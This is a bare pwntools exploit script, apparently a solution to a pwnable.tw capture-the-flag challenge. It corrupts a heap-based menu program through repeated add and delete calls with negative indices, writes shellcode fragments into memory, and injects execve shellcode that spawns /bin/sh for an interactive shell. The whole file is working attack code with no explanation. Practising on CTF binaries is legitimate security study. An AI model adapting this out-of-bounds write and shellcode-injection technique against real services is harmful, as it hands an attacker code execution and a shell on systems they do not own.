#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

def debug():
    gdb.attach(r, "b *0x080487AE\nb *0x8048828")

def add(idx, name):
    r.sendlineafter(" :", '1')
    r.sendlineafter(" :", str(idx))
    r.sendafter(" :", name)

def show(idx):
    r.sendlineafter(" :", '2')
    r.sendlineafter(" :", str(idx))

def dele(idx):
    r.sendlineafter(" :", '3')
    r.sendlineafter(" :", str(idx))

while True:
    try:
        r = process(pwn_file)
        #r = remote("chall.pwnable.tw", 10300)
        for i in range(0x30):
            add(0, 'a\n')
        add(1, 'a\n')
        add(0, 'a\n')
        add(0, 'a\n')
        add(0, 'a\n')
        add(2, 'a\n')
        add(3, 'a\n')
        dele(2)
        dele(3)
        dele(1)
        add(1, 'aaaaXuJ\n')
        dele(1)
        add(-22, 'PXj\n')

        print "start!!!"
        add(-22, asm("xor eax, eax;ret") + '\n')
        print r.recvline()
    except:
        print "error"
        r.close()
        continue
    else:
        break

context.log_level = "debug"
sh = """
    push eax
    pop ebx
    push 11
    pop eax
    int 0x80
"""
add(-27, asm(sh))
add(2, "/bin/sh\x00")
dele(2)

r.interactive()
